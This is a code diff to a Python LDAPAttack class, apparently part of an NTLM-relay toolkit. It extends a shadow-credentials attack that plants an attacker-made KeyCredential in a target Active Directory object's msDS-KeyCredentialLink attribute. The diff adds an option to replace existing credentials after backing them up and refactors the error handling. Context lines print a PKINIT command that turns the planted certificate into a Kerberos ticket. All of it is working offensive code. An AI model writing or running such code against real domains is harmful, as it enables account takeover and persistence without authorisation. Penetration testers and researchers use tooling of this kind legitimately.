@@ -276,6 +276,14 @@ class LDAPAttack(ProtocolAttack):
         else:
             LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))
 
+    def _handleShadowCredentialModifyError(self):
+        if self.client.result['result'] == 50:
+            LOG.error('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
+        elif self.client.result['result'] == 19:
+            LOG.error('Could not modify object, the server reports a constrained violation: %s' % self.client.result['message'])
+        else:
+            LOG.error('The server returned an error: %s' % self.client.result['message'])
+
 
     def shadowCredentialsAttack(self, domainDumper):
         currentShadowCredentialsTarget = self.config.ShadowCredentialsTarget
@@ -318,8 +326,20 @@ class LDAPAttack(ProtocolAttack):
         if not results:
             LOG.error('Could not query target user properties')
             return
+
         try:
-            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential.dumpBinary(), target_dn )]
+            existing_values = results['raw_attributes'].get('msDS-KeyCredentialLink', [])
+            LOG.info('Found %d existing KeyCredential(s) on target object', len(existing_values))
+            if self.config.ShadowCredentialsReplace:
+                if len(existing_values) > 0:
+                    backup_count, backup_path = shadow_credentials.backupKeyCredentialsToJSON(
+                        currentShadowCredentialsTarget, existing_values, self.config.ShadowCredentialsBackupPath)
+                    LOG.info('Exported %d existing KeyCredential(s) to %s', backup_count, backup_path)
+
+                new_values = [shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), target_dn)]
+            else:
+                new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential.dumpBinary(), target_dn )]
+
             LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % currentShadowCredentialsTarget)
             self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.client.result['result'] == 0:
@@ -350,12 +370,7 @@ class LDAPAttack(ProtocolAttack):
                     LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, currentShadowCredentialsTarget, path))
                     delegatePerformed.append(currentShadowCredentialsTarget)
             else:
-                if self.client.result['result'] == 50:
-                    LOG.error('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
-                elif self.client.result['result'] == 19:
-                    LOG.error('Could not modify object, the server reports a constrained violation: %s' % self.client.result['message'])
-                else:
-                    LOG.error('The server returned an error: %s' % self.client.result['message'])
+                self._handleShadowCredentialModifyError()
         except IndexError:
             LOG.info('Attribute msDS-KeyCredentialLink does not exist')
         return
